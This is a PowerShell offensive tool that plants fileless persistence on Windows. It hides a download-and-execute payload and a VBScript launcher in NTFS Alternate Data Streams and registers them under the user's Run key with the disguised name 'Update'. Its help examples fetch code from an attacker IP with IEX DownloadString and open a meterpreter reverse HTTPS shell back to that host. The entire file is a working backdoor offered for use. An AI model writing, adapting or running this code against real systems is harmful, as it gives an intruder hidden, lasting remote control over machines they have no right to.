function Invoke-ADSBackdoor{
<#
.SYNOPSIS
Powershell Script that will use Alternate Data Streams to achieve fileless persistence
Author: Matt Nelson (@enigma0x3)

.DESCRIPTION
This script will obtain fileless persistence on a Windows 7+ machine under both Standard and Administrative accounts by 
using two Alternate Data Streams. The first Alternate Data stream stores the payloadand the second Alternate Data Stream 
stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the 
payload. When passing the arguments, you have to include the function and any parameters required by your payload. 
The arguments must also be in quotation marks.



.EXAMPLE
PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments "hack"

This will use the function "Hack" in payload.ps1 for persistence

.EXAMPLE

PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Shellcode.ps1 -Arguments "Invoke-Shellcode
 -Lhost 192.168.1.138 -LPort 2222 -Payload windows/meterpreter/reverse_https -Force"

This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port 
2222 over HTTPS. 

.EXAMPLE
meterpreter>shell
Process 4780 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.138/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor 
-URL http://192.168.1.138/Invoke-Shellcode.ps1 
-Arguments 'Invoke-Shellcode -LHost 192.168.1.138 -LPort 666 -Payload windows/meterpreter/reverse_https -Force'"

This will execute the persistence script using Invoke-Shellcode as the payload from a meterpreter session

#>
[CmdletBinding()]
Param(
  
   [Parameter(Mandatory=$True)]
   [string]$URL,
    
   [Parameter(Mandatory=$False)]
   [String]$Arguments
   
)


Write-Host  "  -------------------------------------------------------------"
Write-Host " |                 Created by Matt Nelson                      |"
Write-Host " |                       @enigma0x3                            |"
Write-Host " |                www.enigma0x3.wordpress.com                  |"
Write-Host  "  -------------------------------------------------------------"
$TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
$textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
$VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
$vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

#Store Payload
$payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments"
$encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
$payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"
#Store VBS Wrapper
$vbstext1 = "Dim objShell"
$vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
$vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""
$vbstext4 = "objShell.Run command, 0"
$vbstext5 = "Set objShell = Nothing"
$vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5
#Create Alternate Data Streams for Payload and Wrapper
$CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
$CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
Invoke-Command -ScriptBlock $CreatePayloadADS
Invoke-Command -ScriptBlock $CreateWrapperADS
#Persist in Registry
new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
Write-Host "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
}

